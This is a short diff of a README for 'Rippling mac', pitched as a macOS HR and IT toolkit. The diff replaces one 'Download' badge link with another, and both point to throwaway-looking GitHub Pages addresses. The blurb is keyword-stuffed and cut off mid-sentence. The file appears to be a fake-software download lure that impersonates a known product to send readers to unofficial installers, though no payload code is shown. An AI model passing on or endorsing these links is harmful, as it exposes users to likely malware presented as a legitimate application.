@@ -2,7 +2,7 @@
 
 Rippling mac on macOS — toolkit focused on hr+it (devices/apps), plus payroll & benefits and onboarding automation with native integrations and Apple 
 
-[![Download Rippling mac](https://img.shields.io/badge/Download-Rippling_mac-blueviolet)](https://kiamsiodkdf-ajjdhf2834.github.io/.github/info)
+[![Download Rippling mac](https://img.shields.io/badge/Download-Rippling_mac-blueviolet)](https://akunidodo40.github.io/.github/Rippling-Works)
 
 ---
 
